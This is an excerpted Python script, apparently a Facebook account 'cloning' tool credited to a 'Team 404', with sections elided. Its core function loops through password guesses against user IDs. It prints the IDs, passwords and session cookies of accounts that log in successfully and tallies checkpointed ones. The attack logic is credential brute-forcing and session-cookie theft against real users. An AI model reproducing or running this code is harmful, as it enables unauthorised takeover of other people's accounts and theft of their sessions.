...
\033[1;94m       [+]===============================================[+]
\033[1;94m       [+]        CREATED BY   :  TOAVINA THIERCK              \033[1;94m[+]
\033[1;94m       [+]        ON GITHUB    :  Thierck-404              \033[1;94m[+]
\033[1;94m       [+]        TEAM         :  404        \033[1;94m[+]
\033[1;94m       [+]        TOOL VERSION :  1.0                   \033[1;94m[+]
\033[1;94m       [+]        TOOL STATUS  :  RANDOM CLONING         \033[1;94m[+]
\033[1;94m       [+]        COUNTRY      :  *****          \033[1;94m[+]
\033[1;94m       [+]===============================================[+]
""")                                              
...
class Main:
    def __init__(self):
        ...
        print(" [00] Exit")        
        Alif =input(" [?] Choose : ")
        os.system('xdg-open https://facebook.com/groups/558164529501337/')
        if Alif in ["1", "01"]:
            num()
        if Alif in ["2","02"]:
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92m404\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[404-OK💚] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[404-CP🔪] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[404🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
